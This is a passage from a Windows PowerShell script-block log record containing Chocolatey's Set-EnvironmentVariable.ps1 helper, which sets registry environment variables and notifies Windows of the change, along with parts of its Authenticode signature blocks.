KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBOu3ChoK62lTYZ # 9Y709GEKMD/ZFRQI2jbzh+hJKc5Y1KCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgPp4/Gnz1p2MhBlnpEil0vTWoLvzfKqLrdT9+ # qrHVL8MwDQYJKoZIhvcNAQEBBQAEggEAsmbFS+5MO59WHOwvtI/xhg/fORekpXCn # kDdVLu6caJVUh3BVk17uv3eFpYR/I4MU4W65maxIK7l9jhiGcxvF37E94lSqEtZc # LVN5m7dRjiLSSuv2NenuQLr3kIGhQeB4c/lwiZcRBf53ANdTwUbMwF9UtlARxq3R # Hn1/T4caGriEClaXY55qOw4PAxzJC/zze6SwXGarXTY0YyuOHYNZ+VutwOT3/Ilz # Q7kytjehIqtDUhuBZtgv6qdnwJyNJM40WOyVKyg71OFx8EwwuOJDyvy9poKmykuE # aPxVK+DRWgpSwjDy+PCjbbcNS8eaOiJS3uyswv1l6DqRzZ59H6PyaKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAwWjAjBgkqhkiG9w0BCQQxFgQUjP95hMVfZNWYfVjI # L9Cgest1f1MwDQYJKoZIhvcNAQEBBQAEggEALzknQ55rcp9crkxee1A87etbTGT+ # iJZqbaxZIe+Sj34Ml53OIqvMQj35ygkKq02ONTDQiK5EVlYLm8+1Dn/xPF0nanDt # SaihFMa2VKo3mcwDUy4E6vTUfmFrMpCcYXxmbYghGFQO7e6Izq+6UtQIG19mj8Hn # c+6wbmlKuqaJa2KFx5X2QFOoOP18QUeKxDZelbDClc6TRKIlMRuihofcRCByF2Bj # MNpDySXfRafleMS1EybFmmNVrdnaqx+ncCF1ud/niIEH1rAUb52RyPg+WiqGXtUB # PqBJonzDwmRxEvj/a6qYMM+neDEC+DjnSF0CtNZK1rW6MFDgHS+FFvv/kQ== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateyInstall\helpers\functions\Set-EnvironmentVariable.ps1 ¦ ScriptBlockId: 336e6c64-4186-48c1-bb40-94a124a7ed7e ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Set-EnvironmentVariable { <# .SYNOPSIS **NOTE:** Administrative Access Required when `-Scope 'Machine'.` DO NOT USE. Not part of the public API. Use `Install-ChocolateyEnvironmentVariable` instead. .DESCRIPTION Saves an environment variable. .NOTES This command will assert UAC/Admin privileges on the machine if `-Scope 'Machine'`. .INPUTS None .OUTPUTS None .PARAMETER Name .PARAMETER Value .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .LINK Install-ChocolateyEnvironmentVariable .LINK Uninstall-ChocolateyEnvironmentVariable .LINK Install-ChocolateyPath .LINK Get-EnvironmentVariable #> param ( [parameter(Mandatory=$true, Position=0)][string] $Name, [parameter(Mandatory=$false, Position=1)][string] $Value, [parameter(Mandatory=$false, Position=2)] [System.EnvironmentVariableTarget] $Scope, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($Scope -eq [System.EnvironmentVariableTarget]::Process -or $Value -eq $null -or $Value -eq '') { return [Environment]::SetEnvironmentVariable($Name, $Value, $Scope) } [string]$keyHive = 'HKEY_LOCAL_MACHINE' [string]$registryKey = ""SYSTEM\CurrentControlSet\Control\Session Manager\Environment\"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($registryKey) if ($Scope -eq [System.EnvironmentVariableTarget]::User) { $keyHive = 'HKEY_CURRENT_USER' $registryKey = ""Environment"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($registryKey) } [Microsoft.Win32.RegistryValueKind]$registryType = [Microsoft.Win32.RegistryValueKind]::String try { if ($win32RegistryKey.GetValueNames() -contains $Name) { $registryType = $win32RegistryKey.GetValueKind($Name) } } catch { # the value doesn't yet exist # move along, nothing to see here } Write-Debug ""Registry type for $Name is/will be $registryType"" if ($Name -eq 'PATH') { $registryType = [Microsoft.Win32.RegistryValueKind]::ExpandString } [Microsoft.Win32.Registry]::SetValue($keyHive + ""\"" + $registryKey, $Name, $Value, $registryType) try { # make everything refresh # because sometimes explorer.exe just doesn't get the message that things were updated. if (-not (""win32.nativemethods"" -as [type])) { # import sendmessagetimeout from win32 add-type -Namespace Win32 -Name NativeMethods -MemberDefinition @"" [DllImport(""user32.dll"", SetLastError = true, CharSet = CharSet.Auto)] public static extern IntPtr SendMessageTimeout( IntPtr hWnd, uint Msg, UIntPtr wParam, string lParam, uint fuFlags, uint uTimeout, out UIntPtr lpdwResult); ""@ } $HWND_BROADCAST = [intptr]0xffff; $WM_SETTINGCHANGE = 0x1a; $result = [uintptr]::zero # notify all windows of environment block change [win32.nativemethods]::SendMessageTimeout($HWND_BROADCAST, $WM_SETTINGCHANGE, [uintptr]::Zero, ""Environment"", 2, 5000, [ref]$result) | Out-Null # Set a user environment variable making the system refresh $setx = ""$($env:SystemRoot)\System32\setx.exe"" & ""$setx"" ChocolateyLastPathUpdate `""$((Get-Date).ToFileTime())`"" | Out-Null } catch { Write-Warning ""Failure attempting to let Explorer know about updated environment settings.`n $($_.Exception.Message)"" } Update-SessionEnvironment } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBOu3ChoK62lTYZ # 9Y709GEKMD/ZFRQI2jbzh+hJKc5Y1KCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # 